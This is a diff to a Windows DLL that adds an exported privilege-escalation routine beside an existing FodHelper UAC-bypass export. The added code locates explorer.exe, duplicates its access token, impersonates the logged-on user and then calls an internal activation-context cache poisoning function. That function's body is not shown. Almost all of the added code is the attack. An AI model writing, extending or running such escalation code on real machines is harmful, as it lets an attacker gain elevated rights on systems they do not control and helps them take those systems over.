@@ -1,6 +1,8 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include "FodHelperAbuseEscalationUtils.h"
+#include "ActivationContextCachePoisoningEscalation.h"
+#include "shared.h"
 
 #include <shellapi.h>
 #include <windows.h>
@@ -151,4 +153,46 @@ extern "C" __declspec(dllexport) int FodHelperAbuseEscalation() {
     return 0;
 }
 
+extern "C" __declspec(dllexport) int ActivationContextCachePoisoningEscalation() {
+    Marker();
+
+    DWORD explorerPid = FindExplorerPidInMySession();
+    if (!explorerPid) { printf("No explorer.exe found.\n"); return 1; }
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, explorerPid);
+    if (!hProc) { printf("OpenProcess failed: %lu\n", GetLastError()); return 1; }
+
+    HANDLE hTok = NULL;
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTok))
+    {
+        printf("OpenProcessToken failed: %lu\n", GetLastError());
+        CloseHandle(hProc);
+        return 1;
+    }
+    CloseHandle(hProc);
+
+    HANDLE hImpersonation = NULL;
+    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hImpersonation))
+    {
+        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
+        CloseHandle(hTok);
+        return 1;
+    }
+    CloseHandle(hTok);
+
+    if (!ImpersonateLoggedOnUser(hImpersonation))
+    {
+        printf("ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
+        CloseHandle(hImpersonation);
+        return 1;
+    }
+
+    Marker();
+
+    ActivationContextCachePoisoningEscalationInternal();
+
+    RevertToSelf();
+    CloseHandle(hImpersonation);
+    return 0;
+}
 
